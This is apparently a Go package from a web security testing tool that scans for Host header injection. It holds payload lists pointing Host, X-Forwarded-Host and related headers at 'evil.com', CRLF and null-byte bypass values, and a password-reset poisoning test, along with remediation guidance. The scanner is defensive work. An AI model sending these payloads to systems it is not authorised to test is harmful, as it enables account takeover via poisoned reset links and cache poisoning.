// Package hostheader provides Host Header Injection detection capabilities for security testing.
// It detects vulnerabilities like password reset poisoning, cache poisoning, and SSRF via Host header.
package hostheader

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/ui"
)

// VulnerabilityType represents the type of Host header vulnerability
type VulnerabilityType string

const (
	VulnPasswordReset    VulnerabilityType = "password-reset-poisoning"
	VulnCachePoisoning   VulnerabilityType = "cache-poisoning"
	VulnSSRF             VulnerabilityType = "ssrf"
	VulnOpenRedirect     VulnerabilityType = "open-redirect"
	VulnWebCachePoisonng VulnerabilityType = "web-cache-poisoning"
	VulnHostOverride     VulnerabilityType = "host-override"
)

// Severity levels for vulnerabilities
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
)

// Payload represents a Host header injection payload
type Payload struct {
	Header      string // Header name (Host, X-Forwarded-Host, etc.)
	Value       string
	Description string
}

// Vulnerability represents a detected Host header vulnerability
type Vulnerability struct {
	Type          VulnerabilityType
	Description   string
	Severity      Severity
	URL           string
	Header        string
	InjectedValue string
	Evidence      string
	Remediation   string
	CVSS          float64
}

// ScanResult represents the result of a scan
type ScanResult struct {
	URL             string
	TestedHeaders   int
	Vulnerabilities []Vulnerability
	StartTime       time.Time
	Duration        time.Duration
}

// TesterConfig holds configuration for the Host header tester
type TesterConfig struct {
	Timeout     time.Duration
	UserAgent   string
	Client      *http.Client
	CallbackURL string // For OOB testing
}

// Tester provides Host header injection testing capabilities
type Tester struct {
	config   *TesterConfig
	payloads []Payload
	client   *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:   30 * time.Second,
		UserAgent: ui.UserAgent(),
	}
}

// NewTester creates a new Host header injection tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = &http.Client{
			Timeout: config.Timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // Don't follow redirects
			},
		}
	}

	t := &Tester{
		config: config,
		client: client,
	}

	t.payloads = t.generatePayloads()
	return t
}

// generatePayloads generates Host header injection payloads
func (t *Tester) generatePayloads() []Payload {
	var payloads []Payload

	attackDomain := "evil.com"
	if t.config.CallbackURL != "" {
		attackDomain = t.config.CallbackURL
	}

	// Host header payloads
	hostPayloads := []struct {
		header string
		value  string
		desc   string
	}{
		// Direct Host header manipulation
		{"Host", attackDomain, "Direct host replacement"},
		{"Host", fmt.Sprintf("127.0.0.1:%s", attackDomain), "Port injection with host"},
		{"Host", fmt.Sprintf("localhost/%s", attackDomain), "Path injection"},
		{"Host", fmt.Sprintf("original.com@%s", attackDomain), "At sign injection"},
		{"Host", fmt.Sprintf("original.com#%s", attackDomain), "Hash injection"},
		{"Host", fmt.Sprintf("%s.original.com", attackDomain), "Subdomain injection"},

		// X-Forwarded-Host
		{"X-Forwarded-Host", attackDomain, "X-Forwarded-Host override"},
		{"X-Forwarded-Host", fmt.Sprintf("%s:443", attackDomain), "X-Forwarded-Host with port"},

		// X-Host
		{"X-Host", attackDomain, "X-Host override"},

		// X-Forwarded-Server
		{"X-Forwarded-Server", attackDomain, "X-Forwarded-Server override"},

		// X-HTTP-Host-Override
		{"X-HTTP-Host-Override", attackDomain, "X-HTTP-Host-Override"},

		// Forwarded header (RFC 7239)
		{"Forwarded", fmt.Sprintf("host=%s", attackDomain), "RFC 7239 Forwarded host"},
		{"Forwarded", fmt.Sprintf("host=%s;proto=https", attackDomain), "Forwarded with proto"},

		// X-Original-URL / X-Rewrite-URL
		{"X-Original-URL", fmt.Sprintf("/%s", attackDomain), "X-Original-URL override"},
		{"X-Rewrite-URL", fmt.Sprintf("/%s", attackDomain), "X-Rewrite-URL override"},

		// X-Forwarded-For with Host
		{"X-Forwarded-For", attackDomain, "X-Forwarded-For host injection"},

		// True-Client-IP
		{"True-Client-IP", attackDomain, "True-Client-IP injection"},

		// X-Real-IP
		{"X-Real-IP", attackDomain, "X-Real-IP injection"},

		// X-Client-IP
		{"X-Client-IP", attackDomain, "X-Client-IP injection"},

		// Cache poisoning specific
		{"X-Forwarded-Scheme", "http", "Scheme downgrade"},
		{"X-Forwarded-Proto", "http", "Proto downgrade"},
		{"X-Forwarded-Ssl", "off", "SSL downgrade"},
		{"X-Url-Scheme", "http", "URL scheme override"},

		// Port manipulation
		{"X-Forwarded-Port", "443", "Port override"},
		{"X-Forwarded-Port", "8080", "Non-standard port"},
	}

	for _, p := range hostPayloads {
		payloads = append(payloads, Payload{
			Header:      p.header,
			Value:       p.value,
			Description: p.desc,
		})
	}

	// Absolute URL payloads (some servers accept absolute URLs)
	absolutePayloads := []struct {
		header string
		value  string
		desc   string
	}{
		{"Host", "", "Empty host with absolute URL"},
		{"Host", ".", "Dot host"},
		{"Host", "..", "Double dot host"},
	}

	for _, p := range absolutePayloads {
		payloads = append(payloads, Payload{
			Header:      p.header,
			Value:       p.value,
			Description: p.desc,
		})
	}

	return payloads
}

// GetPayloads returns all payloads or filtered by header
func (t *Tester) GetPayloads(header string) []Payload {
	if header == "" {
		return t.payloads
	}

	var filtered []Payload
	for _, p := range t.payloads {
		if strings.EqualFold(p.Header, header) {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// checkReflection checks if the injected value is reflected in the response
func checkReflection(body, injectedValue string) (bool, string) {
	if injectedValue == "" {
		return false, ""
	}

	// Direct check
	if strings.Contains(body, injectedValue) {
		// Find context
		idx := strings.Index(body, injectedValue)
		start := idx - 50
		if start < 0 {
			start = 0
		}
		end := idx + len(injectedValue) + 50
		if end > len(body) {
			end = len(body)
		}
		return true, body[start:end]
	}

	return false, ""
}

// checkLocationHeader checks for Host header reflection in Location header
func checkLocationHeader(headers http.Header, injectedValue string) (bool, string) {
	location := headers.Get("Location")
	if location != "" && strings.Contains(location, injectedValue) {
		return true, location
	}
	return false, ""
}

// TestURL tests a URL for Host header injection vulnerabilities
func (t *Tester) TestURL(ctx context.Context, targetURL string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	for _, payload := range t.payloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		resp, err := t.sendRequest(ctx, targetURL, payload)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBodyDefault(resp.Body)
		iohelper.DrainAndClose(resp.Body)
		bodyStr := string(body)

		// Check for reflection in body
		if reflected, evidence := checkReflection(bodyStr, payload.Value); reflected {
			vulns = append(vulns, Vulnerability{
				Type:          VulnHostOverride,
				Description:   fmt.Sprintf("Host header reflected via %s", payload.Description),
				Severity:      SeverityHigh,
				URL:           targetURL,
				Header:        payload.Header,
				InjectedValue: payload.Value,
				Evidence:      evidence,
				Remediation:   GetRemediation(),
				CVSS:          7.5,
			})
		}

		// Check for reflection in Location header (potential redirect poisoning)
		if reflected, evidence := checkLocationHeader(resp.Header, payload.Value); reflected {
			vulns = append(vulns, Vulnerability{
				Type:          VulnOpenRedirect,
				Description:   fmt.Sprintf("Host header reflected in redirect via %s", payload.Description),
				Severity:      SeverityHigh,
				URL:           targetURL,
				Header:        payload.Header,
				InjectedValue: payload.Value,
				Evidence:      evidence,
				Remediation:   GetRemediation(),
				CVSS:          6.1,
			})
		}

		// Check for cache poisoning indicators
		cacheHeaders := []string{"X-Cache", "CF-Cache-Status", "Age", "Cache-Control"}
		for _, cacheHeader := range cacheHeaders {
			if resp.Header.Get(cacheHeader) != "" {
				// If we have cache indicators and host is reflected, it's cache poisoning
				if reflected, _ := checkReflection(bodyStr, payload.Value); reflected {
					vulns = append(vulns, Vulnerability{
						Type:          VulnCachePoisoning,
						Description:   fmt.Sprintf("Potential cache poisoning via %s (cache headers present)", payload.Header),
						Severity:      SeverityCritical,
						URL:           targetURL,
						Header:        payload.Header,
						InjectedValue: payload.Value,
						Evidence:      fmt.Sprintf("%s: %s", cacheHeader, resp.Header.Get(cacheHeader)),
						Remediation:   GetCachePoisoningRemediation(),
						CVSS:          9.0,
					})
					break
				}
			}
		}
	}

	return vulns, nil
}

// sendRequest sends an HTTP request with the Host header payload
func (t *Tester) sendRequest(ctx context.Context, targetURL string, payload Payload) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	// Set the header
	if payload.Header == "Host" && payload.Value != "" {
		req.Host = payload.Value
	} else {
		req.Header.Set(payload.Header, payload.Value)
	}

	return t.client.Do(req)
}

// TestPasswordReset tests a password reset endpoint for Host header poisoning
func (t *Tester) TestPasswordReset(ctx context.Context, targetURL string, email string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	attackDomain := "evil.com"
	if t.config.CallbackURL != "" {
		attackDomain = t.config.CallbackURL
	}

	// Create password reset request
	form := strings.NewReader(fmt.Sprintf("email=%s", email))
	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, form)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", t.config.UserAgent)

	// Inject X-Forwarded-Host
	req.Header.Set("X-Forwarded-Host", attackDomain)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	bodyStr := string(body)

	// Check if the response mentions the attack domain
	if strings.Contains(bodyStr, attackDomain) {
		vulns = append(vulns, Vulnerability{
			Type:          VulnPasswordReset,
			Description:   "Password reset link may be poisoned via X-Forwarded-Host",
			Severity:      SeverityCritical,
			URL:           targetURL,
			Header:        "X-Forwarded-Host",
			InjectedValue: attackDomain,
			Evidence:      "Attacker domain reflected in response",
			Remediation:   GetPasswordResetRemediation(),
			CVSS:          9.8,
		})
	}

	return vulns, nil
}

// Scan performs a full Host header injection scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	vulns, err := t.TestURL(ctx, targetURL)
	if err != nil {
		result.Duration = time.Since(startTime)
		return result, err
	}

	result.TestedHeaders = len(t.payloads)
	result.Vulnerabilities = vulns
	result.Duration = time.Since(startTime)

	return result, nil
}

// AllVulnerabilityTypes returns all Host header vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnPasswordReset,
		VulnCachePoisoning,
		VulnSSRF,
		VulnOpenRedirect,
		VulnWebCachePoisonng,
		VulnHostOverride,
	}
}

// HostOverrideHeaders returns all headers that can override the Host
func HostOverrideHeaders() []string {
	return []string{
		"Host",
		"X-Forwarded-Host",
		"X-Host",
		"X-Forwarded-Server",
		"X-HTTP-Host-Override",
		"Forwarded",
		"X-Original-URL",
		"X-Rewrite-URL",
	}
}

// GetRemediation returns remediation guidance for Host header injection
func GetRemediation() string {
	return `1. Use a whitelist of allowed Host header values
2. Configure the web server to only accept valid Host headers
3. Don't use the Host header to generate URLs in the application
4. Use a fixed, configured hostname for generating absolute URLs
5. Validate and sanitize Host header before use
6. Ignore X-Forwarded-Host and similar headers unless from trusted proxies
7. Configure reverse proxies to set a known Host header value`
}

// GetPasswordResetRemediation returns remediation for password reset poisoning
func GetPasswordResetRemediation() string {
	return `1. Never use the Host header to construct password reset URLs
2. Store the application's base URL in configuration
3. Validate email addresses before sending reset links
4. Implement rate limiting on password reset requests
5. Log and monitor password reset attempts
6. Use HTTPS for all password reset links`
}

// GetCachePoisoningRemediation returns remediation for cache poisoning
func GetCachePoisoningRemediation() string {
	return `1. Exclude Host-related headers from cache keys
2. Configure cache to not cache responses with X-Forwarded-Host
3. Use Vary header appropriately
4. Implement cache key normalization
5. Validate Host headers before caching responses
6. Consider using signed URLs for sensitive cached content`
}

// IsResetPasswordEndpoint checks if a URL is likely a password reset endpoint
func IsResetPasswordEndpoint(urlStr string) bool {
	indicators := []string{
		"/reset", "/password", "/forgot",
		"/recover", "/account/reset",
		"/user/reset", "/auth/reset",
		"reset-password", "forgot-password",
		"/passwordreset", "/forgotpassword",
	}

	lower := strings.ToLower(urlStr)
	for _, indicator := range indicators {
		if strings.Contains(lower, indicator) {
			return true
		}
	}
	return false
}

// GenerateBypassPayloads generates advanced bypass payloads
func GenerateBypassPayloads(targetHost, attackDomain string) []Payload {
	return []Payload{
		{Header: "Host", Value: fmt.Sprintf("%s\r\nX-Injected: true", targetHost), Description: "CRLF injection"},
		{Header: "Host", Value: fmt.Sprintf("%s\t%s", targetHost, attackDomain), Description: "Tab injection"},
		{Header: "Host", Value: fmt.Sprintf("%s %s", targetHost, attackDomain), Description: "Space injection"},
		{Header: "Host", Value: fmt.Sprintf("%s%%00%s", targetHost, attackDomain), Description: "Null byte injection"},
		{Header: "Host", Value: fmt.Sprintf("%s/%s", targetHost, attackDomain), Description: "Path in host"},
		{Header: "Host", Value: fmt.Sprintf("%s@%s", attackDomain, targetHost), Description: "Credential injection"},
		{Header: "X-Forwarded-Host", Value: fmt.Sprintf("%s, %s", targetHost, attackDomain), Description: "Multiple hosts"},
	}
}
